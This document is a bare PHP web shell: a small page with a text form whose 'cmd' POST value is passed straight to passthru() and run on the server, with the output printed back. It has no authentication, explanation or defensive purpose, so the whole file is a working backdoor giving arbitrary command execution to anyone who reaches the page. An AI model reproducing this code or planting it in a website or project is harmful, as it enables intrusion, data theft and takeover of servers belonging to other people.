<?
$cmd = stripslashes($_POST["cmd"]);
?>
<form name="form1" method="post" action="">
  <input type="text" name="cmd" value="<?echo str_replace("\"","&quot;",$cmd);?>" size="150">
  <input type="submit" name="B_SUBMIT" value="Go">
</form>
<?

if ($cmd != "") {
    echo "<pre>";
    echo passthru("$cmd");
    echo "</pre>";
    exit;
}

?>